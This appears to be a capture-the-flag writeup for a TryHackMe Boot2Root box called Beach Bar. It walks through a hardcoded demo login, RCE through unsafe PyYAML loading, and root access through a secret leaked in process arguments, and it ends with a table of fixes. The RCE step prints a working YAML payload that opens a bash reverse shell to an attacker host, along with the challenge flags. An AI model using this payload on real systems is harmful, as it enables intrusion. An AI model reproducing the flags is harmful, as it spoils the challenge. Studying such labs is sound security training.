# TryHackMe // Byte Lotus: Beach Bar — Boot2Root Writeup

**Category:** Boot2Root
**Difficulty:** Easy
**Points:** 60
**Flags:** User + Root

## Overview

Beach Bar is a Flask-based "jukebox request" web app fronting a Boot2Root
box. The briefing text drops three deliberate hints:

- *"a DJ who never logs out"* → a hardcoded demo credential left enabled
- *"a song queue that accepts a little more than song titles"* → unsafe
  YAML deserialization on a playlist import feature
- *"a service down the boardwalk quietly announcing 'something'"* → a
  root-owned systemd service leaking a secret via its process arguments

All three clues turned out to be literal, in-order steps of the attack
chain.

## Recon

```bash
nmap -sC -sV -p- -oN nmap_full.txt <target>
```

Only two ports open:

- `22/tcp` — OpenSSH 9.6p1
- `80/tcp` — Gunicorn, redirecting to `/login` ("Beach Bar // Sign in")

Everything else showed as `filtered`, so the entire attack surface lived
inside the single web application on port 80.

## Step 1 — Initial Access: Hardcoded Demo Credential

Viewing the `/login` page source revealed an HTML comment left in by the
developers:

```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

Logging in with `dj:dj` granted access to the DJ dashboard
(`/dashboard`), which exposed a playlist **Export**/**Import** feature:

> "Bring a set from another night: Export the current playlist as YAML,
> tweak it, and load it back via Import."

## Step 2 — RCE via Unsafe YAML Deserialization

Exporting the current playlist returned a straightforward YAML document:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

The `/import` route parsed uploaded YAML with `yaml.load(content,
Loader=yaml.Loader)` instead of `yaml.safe_load()` — a classic PyYAML
insecure deserialization sink that permits arbitrary Python object
construction via `!!python/object/apply` tags.

Payload:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
exploit: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'"]
```

Listener:

```bash
nc -lvnp 4444
```

Uploading this via `/import` triggered the payload on parse, returning a
reverse shell as the `bartender` low-privilege user:

```
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

### User Flag

```bash
cat /home/bartender/user.txt
```

```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

## Step 3 — Privilege Escalation: Secret Leaked via Process Arguments

`bartender` had no useful `sudo` rights and no writable SUID/cron paths.
Enumerating running services surfaced the "service quietly announcing
something" from the briefing:

```bash
ps aux | grep jukebox
```

```
root  608  ...  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

`jukeboxd.service` runs as **root**, and its `--stream-pass` argument is
passed on the command line — visible to *any* local user via `ps aux`,
regardless of file permissions on the script or systemd unit itself.

The leaked secret, `SunsetSpritz2024!`, was reused as the **root**
account's own login password:

```bash
su
Password: SunsetSpritz2024!
```

```
root@tryhackme-2404:/opt/beach-bar/webapp#
```

### Root Flag

```bash
cat /root/root.txt
```

```
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

## Root Cause Summary

| Step | Weakness | Fix |
|---|---|---|
| Auth | Demo credential (`dj:dj`) left enabled in production | Remove/disable demo accounts before launch; never ship auth bypasses behind a comment |
| RCE | `yaml.load()` used instead of `yaml.safe_load()` | Always use `safe_load()` (or `SafeLoader`) for any YAML from an untrusted source |
| Privesc | Secret passed as a CLI argument to a root-owned process | Pass secrets via env vars, a restricted-permission config file, or a secrets manager — never argv, which is world-readable via `/proc/<pid>/cmdline` and `ps aux` |
| Privesc | Password reuse between a service secret and the root account | Enforce unique credentials per system/service; rotate on any suspected exposure |

## Attack Chain

```
Hardcoded demo login (dj:dj)
        │
        ▼
DJ dashboard → playlist Import/Export feature
        │
        ▼
Unsafe yaml.load() → RCE → reverse shell (bartender)
        │
        ▼
ps aux reveals jukeboxd --stream-pass (root process, leaked secret)
        │
        ▼
Password reuse: su → root
        │
        ▼
root.txt
```

## Flags

- **User:** `THM{y4ml_pl4yl1st_pwns_th3_b34ch}`
- **Root:** `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}`
